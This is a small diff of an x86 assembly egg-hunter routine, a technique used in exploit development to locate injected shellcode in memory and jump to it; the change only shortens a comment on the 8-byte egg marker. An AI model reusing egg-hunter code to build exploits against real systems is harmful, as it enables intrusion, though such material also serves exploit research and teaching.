@@ -25,8 +25,7 @@ next_byte:
     jnz next_byte           ; didnt find second 4 bytes of egg
     jmp edx                 ; egg found
  
-    ; Marker bytes, enables hunter code to find the start of the
-    ; shellcode payload, must be executable code to work correctly.
+    ; Egg - 8 bytes
     nop                     ; 0x90
     push eax                ; 0x50
     nop
